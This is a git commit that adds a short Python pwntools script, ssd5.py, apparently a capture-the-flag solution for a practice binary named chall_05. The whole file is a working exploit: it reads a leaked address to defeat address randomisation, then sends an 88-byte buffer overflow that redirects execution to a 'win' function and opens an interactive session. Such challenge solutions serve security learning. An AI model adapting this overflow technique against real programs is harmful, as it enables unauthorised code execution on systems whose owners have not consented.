e44eb02830a201104297991b645635a67563f1bb
prasadh-l <69853634+prasadh-l@users.noreply.github.com>
2024-05-21 17:58:13 -0400

    Create ssd5.py

---
+++ chall_05/ssd5.py
@@ -0,0 +1,10 @@
+from pwn import *
+p=process("./chall_05")
+p.recvuntil(":")
+leak=p.recv()
+intleak = int(leak,16)
+elf=ELF("./chall_05")
+elf.address = intleak - elf.sym.main
+hex(elf.address)
+p.sendline(b'a'*88+p64(elf.sym.win))
+p.interactive()
